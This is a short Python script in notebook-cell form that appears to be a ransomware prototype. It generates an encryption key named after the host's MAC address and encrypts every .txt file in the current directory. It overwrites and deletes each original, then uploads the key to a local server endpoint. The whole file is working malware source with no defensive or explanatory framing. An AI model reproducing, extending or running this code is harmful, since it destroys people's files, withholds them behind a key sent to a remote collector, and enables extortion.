# %%
#imports
import os
import random
import string
import requests
from getmac import get_mac_address as gma
from cryptography.fernet import Fernet

# %%
#setup
key_file = str(gma()).replace(':', '.') + '.key'
if os.path.exists(key_file):
    os.remove(key_file)
key = Fernet.generate_key()

with open(key_file, 'wb') as keyfile:
    keyfile.write(key)

# %%
#use generated key
fernet = Fernet(key)

# %%
def secure_delete(file):
    #open file for writing
    with open(file, 'wb') as f:
        #overwrite the file with random data
        for i in range(25):
            data = ''.join(random.choice(string.printable) for _ in range(1024))
            f.write(data.encode('utf-8'))
    
    #delete the file
    os.remove(file)

# %%
def encrypt_file(file):
    #get data
    with open(file, 'rb') as infile:
        original = infile.read()

    #remove original file
    secure_delete(file)

    #encrypt the data
    encrypted = fernet.encrypt(original)

    #generate new filename
    filename, ext = os.path.splitext(file)
    file = filename + '.dec'
    encrypted += ('\n' + ext).encode('utf-8')

    #write encrypted data
    with open(file, 'wb') as outfile:
        outfile.write(encrypted)

# %%
directory = os.getcwd()
files = []

for file in os.listdir(directory):
    if file.endswith('.txt'):
        files.append(os.path.join(directory, file))
print(files)

# %%
for file in files:
    encrypt_file(file)

# %%
url = "http://127.0.0.1:5000/upload"
file = {'file': (gma().replace(':','.') + '.key', open(gma().replace(':','.') + '.key', 'rb'))}

response = requests.post(url, files=file)


